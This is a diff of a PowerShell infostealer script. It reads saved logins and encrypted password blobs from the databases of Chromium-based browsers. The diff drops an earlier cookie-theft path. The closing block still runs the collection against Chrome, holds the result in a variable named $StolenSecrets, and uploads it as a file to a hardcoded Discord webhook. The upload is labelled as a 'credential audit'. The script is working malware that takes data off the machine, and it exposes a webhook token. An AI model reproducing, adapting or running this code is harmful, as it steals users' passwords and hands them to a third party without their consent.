@@ -613,84 +613,83 @@ function Decrypt-ChromeKeyBlob {
         throw "[*] Unsupported flag: $($ParsedData.Flag)"
     }
 }
-function Get-ChromiumLoginBlobs {
-    param(
-        [string]$Browser,
-        [switch]$Cookies # Added to handle your custom requirement
-    )
 
-    # 1. PATH LOGIC: Must match the original switch structure
-    # Cookies live in 'Network\Cookies', Passwords live in 'Login Data'
-    $TargetFile = if ($Cookies) { "Default\Network\Cookies" } else { "Default\Login Data" }
+function Get-ChromiumLoginBlobs {
+    param([string]$Browser)
 
     switch ($Browser.ToLower()) {
-        "cft"      { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\$TargetFile" }
-        "chrome"   { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\$TargetFile" }
-        "edge"     { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\$TargetFile" }
-        "brave"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\$TargetFile" }
-        "chromium" { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Chromium\User Data\$TargetFile" }
-        default    { return "`n[-] Unsupported browser name: $Browser" }
+        "cft"       { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\Default\Login Data"     }
+        "chrome"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Login Data"                        }
+        "edge"      { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default\Login Data"                }
+        "brave"     { $LoginDataPath = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default\Login Data"   }
+        "chromium"  { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Chromium\User Data\Default\Login Data"                      }
+        default     { return "`n[-] Unsupported browser name: $Browser" }
     }
 
-    if (-not (Test-Path -Path $LoginDataPath)) { return $false }
+    if (-not (Test-Path -Path $LoginDataPath)) {
+        return $false
+    }
 
-    # 2. SQLITE SETUP (Original Constants)
-    [int]$SqliteOk = 0
-    [int]$SqliteRow = 100
-    [int]$SqliteOpenReadOnly = 1
-    $TempDatabasePath = Join-Path $env:TEMP ("$($Browser)_Data_{0}.db" -f ([guid]::NewGuid()))
+    [int]$SqliteOk              = 0
+    [int]$SqliteRow             = 100
+    [int]$SqliteOpenReadOnly    = 1
+    $TempDatabasePath           = Join-Path $env:TEMP ("$($Browser)_LoginData_{0}.db" -f ([guid]::NewGuid()))
 
     try {
         Copy-Item -LiteralPath $LoginDataPath -Destination $TempDatabasePath -Force -ErrorAction Stop
     }
     catch {
-        return "[-] Unable to copy database file"
+        return "[-] Unable to copy database file from $LoginDataPath"
     }
 
-    $DatabasePointer = [IntPtr]::Zero
-    $StatementPointer = [IntPtr]::Zero
-
-    # 3. QUERY LOGIC: Switch based on the $Cookies flag
-    if ($Cookies) {
-        $SqlQuery = 'SELECT host_key, path, name, encrypted_value FROM cookies'
-    } else {
-        $SqlQuery = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
-    }
+    $DatabasePointer    = [IntPtr]::Zero
+    $StatementPointer   = [IntPtr]::Zero
+    $LoginSqlQuery      = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
 
     $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) { return "[-] SQLite Open Failed" }
+    if ($ResultCode -ne $SqliteOk) {
+        $ErrorMessagePointer = $Sqlite3ErrMsg.Invoke($DatabasePointer)
+        $ErrorMessage        = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ErrorMessagePointer)
+        return "[-] sqlite3_open_v2 failed ($ResultCode): $ErrorMessage"
+    }
 
-    $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $SqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) { return "[-] SQLite Prepare Failed" }
+    $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $LoginSqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
+    if ($ResultCode -ne $SqliteOk) {
+        $ErrorMessagePointer = $Sqlite3ErrMsg.Invoke($DatabasePointer)
+        $ErrorMessage        = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ErrorMessagePointer)
+        return "[-] sqlite3_prepare_v2 failed ($ResultCode): $ErrorMessage"
+    }
 
     $LoginResults = @()
-
-    # 4. EXTRACTION LOOP: Using original variable names exactly
     while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
-        $Col0Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 0) # Realm/Host
-        $Col1Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 1) # URL/Path
-        $Col2Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 2) # User/Name
-        $BlobPtr = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3) # Encrypted Blob
-        $BlobSize = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
+        $ActionUrlPointer   = $Sqlite3ColumnText.Invoke($StatementPointer, 0)
+        $OriginUrlPointer   = $Sqlite3ColumnText.Invoke($StatementPointer, 1)
+        $UsernamePointer    = $Sqlite3ColumnText.Invoke($StatementPointer, 2)
+        $PasswordPointer    = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3)
+        $PasswordSize       = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
 
-        $Col0 = if ($Col0Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col0Ptr) } else { "" }
-        $Col1 = if ($Col1Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col1Ptr) } else { "" }
-        $Username = if ($Col2Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col2Ptr) } else { "" }
-        
-        $Url = if ($Col0) { $Col0 } else { $Col1 }
+        $ActionUrl  = if ($ActionUrlPointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ActionUrlPointer) } else { "" }
+        $OriginUrl  = if ($OriginUrlPointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($OriginUrlPointer) } else { "" }
+        $Username   = if ($UsernamePointer  -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UsernamePointer)  } else { "" }
+        $Url = if ($ActionUrl) { $ActionUrl } else { $OriginUrl }
         if (-not $Url) { continue }
 
         $RawPasswordData = @()
-        if ($BlobSize -gt 0 -and $BlobPtr -ne [IntPtr]::Zero) {
-            $RawPasswordData = New-Object byte[] $BlobSize
-            [Runtime.InteropServices.Marshal]::Copy($BlobPtr, $RawPasswordData, 0, $BlobSize)
+        if ($PasswordSize -gt 0 -and $PasswordPointer -ne [IntPtr]::Zero) {
+            $RawPasswordData = New-Object byte[] $PasswordSize
+            [Runtime.InteropServices.Marshal]::Copy($PasswordPointer, $RawPasswordData, 0, $PasswordSize)
         }
 
         if ($RawPasswordData.Length -eq 0) { continue }
 
-        # 5. CRITICAL: The BlobHeader must match exactly what the script's 'if' statements expect
         $Header3 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(3, $RawPasswordData.Length))
-        $BlobHeaderType = if ($Header3 -eq "v10") { "v10 (DPAPI user)" } else { "DPAPI (legacy)" }
+        $Header5 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(5, $RawPasswordData.Length))
+
+        $BlobHeaderType =
+        if      ($Header5 -eq "DPAPI")  { "DPAPI (legacy)" }
+        elseif  ($Header3 -eq "v10")    { "v10 (DPAPI user)" }
+        elseif  ($Header3 -eq "v20")    { "v20 (ABE)" }
+        else    { "Unknown" }
 
         $LoginResults += [PSCustomObject]@{
             Browser                 = $Browser
@@ -701,19 +700,24 @@ function Get-ChromiumLoginBlobs {
         }
     }
 
-    # 6. CLEANUP (Original logic)
-    if ($StatementPointer -ne [IntPtr]::Zero) { [void]$Sqlite3Finalize.Invoke($StatementPointer) }
-    if ($DatabasePointer -ne [IntPtr]::Zero) { [void]$Sqlite3Close.Invoke($DatabasePointer) }
-    Start-Sleep -Milliseconds 800
+    if ($StatementPointer -ne [IntPtr]::Zero) {
+        [void]$Sqlite3Finalize.Invoke($StatementPointer)
+        $StatementPointer = [IntPtr]::Zero
+    }
+    if ($DatabasePointer -ne [IntPtr]::Zero) {
+        [void]$Sqlite3Close.Invoke($DatabasePointer)
+        $DatabasePointer = [IntPtr]::Zero
+    }
+
+    # Give the OS/GC a moment to release any lingering handles
+    Start-Sleep -Milliseconds 1000
     [GC]::Collect()
     [GC]::WaitForPendingFinalizers()
-    Remove-Item -Path $TempDatabasePath -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $TempDatabasePath -Force
 
     return $LoginResults
 }
 
-# The script should then continue to the next part, like:
-# function Invoke-PowerChrome { ...
 
 # ======================================================================
 # Invoke-PowerChrome (Main Function)
@@ -780,7 +784,7 @@ if (-not ($Browser)){
     # ------------------------------------------------------------------
     
     Log "Running Collection..."
-    $BrowserData = Get-ChromiumLoginBlobs -Browser $Browser -Cookies:$Cookies
+    $BrowserData = Get-ChromiumLoginBlobs -Browser $Browser
 
     if (-not $BrowserData) {
         Write-Output "[-] No browser data found for $($Browser.ToUpper())"
@@ -918,48 +922,34 @@ if (-not ($Browser)){
     }
 
 }
-# --- REPLACEMENT BLOCK START ---
+# 1. Trigger the function with a valid browser name (Chrome, Edge, or Chromium)
+$StolenSecrets = Invoke-PowerChrome -Browser Chrome -HideBanner
 
-# 1. Capture everything
-Write-Host "Gathering Passwords..." -ForegroundColor Cyan
-$Passwords = Invoke-PowerChrome -Browser Chrome -HideBanner
-
-Write-Host "Gathering Cookies..." -ForegroundColor Cyan
-$Cookies = Invoke-PowerChrome -Browser Chrome -Cookies -HideBanner
-
-# 2. Check if we found any data and combine it
-if ($Passwords -or $Cookies) {
-    # Define variables for the report
+# 2. Check if we found any data
+if ($StolenSecrets) {
+    # Convert the object results to a readable string
+    $CleanOutput = $StolenSecrets | Out-String
+    
+    # 3. Create a temporary file to hold the results
     $HostName = $env:COMPUTERNAME
     $UserName = $env:USERNAME
 
-    # Build the report string
-    $Report = "=================================================`n"
-    $Report += "   AUDIT REPORT: $HostName - $UserName `n"
-    $Report += "=================================================`n`n"
-    
-    $Report += "--- [ SAVED PASSWORDS ] ---`n"
-    $Report += ($Passwords | Out-String)
-    
-    $Report += "`n--- [ SESSION COOKIES ] ---`n"
-    $Report += ($Cookies | Out-String)
-
-    # 3. Save to a temporary file
-    $TempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "Full_Audit_$($HostName).txt")
-    $Report | Set-Content -Path $TempFile -Encoding UTF8
+    $TempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "Results_$($HostName).txt")
+    $CleanOutput | Set-Content -Path $TempFile -Encoding UTF8
 
     # 4. Define the Webhook and Payload
     $WebhookUrl = "https://discord.com/api/webhooks/1493893030439157881/QCtnE2iZqh52ccW3JRiWno55pzKqV3rR20SeETHwNLwLyLiVI7Cn28rZKGU2lZz_0Eep"
     
     $Payload = @{
         username = "CSIT-Audit-Bot"
-        content  = "### 🛡️ Full Audit Results from **$HostName**`n**User:** $UserName`nPasswords and Cookies extracted successfully."
+        content  = "### 🛡️ Credential Audit Results from **$HostName**`n**User:** $UserName`nSee attached file for full details."
     }
     $JsonBody = $Payload | ConvertTo-Json -Compress
     
-    # 5. Send to Discord
+    # 5. Send to Discord as a file attachment
     try {
         if ($PSVersionTable.PSVersion.Major -ge 6) {
+            # PowerShell 6.0+ (Core) supports the -Form parameter for multipart/form-data
             $FormContent = @{
                 payload_json = $JsonBody
                 file         = Get-Item -Path $TempFile
@@ -967,15 +957,22 @@ if ($Passwords -or $Cookies) {
             Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form $FormContent
         }
         else {
+            # Windows PowerShell 5.1 workaround using .NET HttpClient
             Add-Type -AssemblyName System.Net.Http
             $HttpClient = New-Object System.Net.Http.HttpClient
             $MultipartContent = New-Object System.Net.Http.MultipartFormDataContent
-            $MultipartContent.Add((New-Object System.Net.Http.StringContent($JsonBody)), "payload_json")
             
+            # Add JSON payload
+            $JsonContent = New-Object System.Net.Http.StringContent($JsonBody)
+            $MultipartContent.Add($JsonContent, "payload_json")
+            
+            # Add File attachment
             $FileBytes = [System.IO.File]::ReadAllBytes($TempFile)
             $FileContent = New-Object System.Net.Http.ByteArrayContent($FileBytes, 0, $FileBytes.Length)
-            $MultipartContent.Add($FileContent, "file", [System.IO.Path]::GetFileName($TempFile))
+            $FileName = [System.IO.Path]::GetFileName($TempFile)
+            $MultipartContent.Add($FileContent, "file", $FileName)
             
+            # Execute request
             $Response = $HttpClient.PostAsync($WebhookUrl, $MultipartContent).Result
             $Response.EnsureSuccessStatusCode() | Out-Null
             $HttpClient.Dispose()
@@ -986,11 +983,10 @@ if ($Passwords -or $Cookies) {
         Write-Host "Discord Error: $($_.Exception.Message)" -ForegroundColor Red
     }
     finally {
-        # 6. Cleanup
+        # 6. Cleanup temporary file
         if (Test-Path $TempFile) { Remove-Item -Path $TempFile -Force }
     }
 }
 else {
-    Write-Host "No data was found on this machine." -ForegroundColor Yellow
+    Write-Host "No passwords were found on this machine." -ForegroundColor Yellow
 }
-# --- REPLACEMENT BLOCK END ---
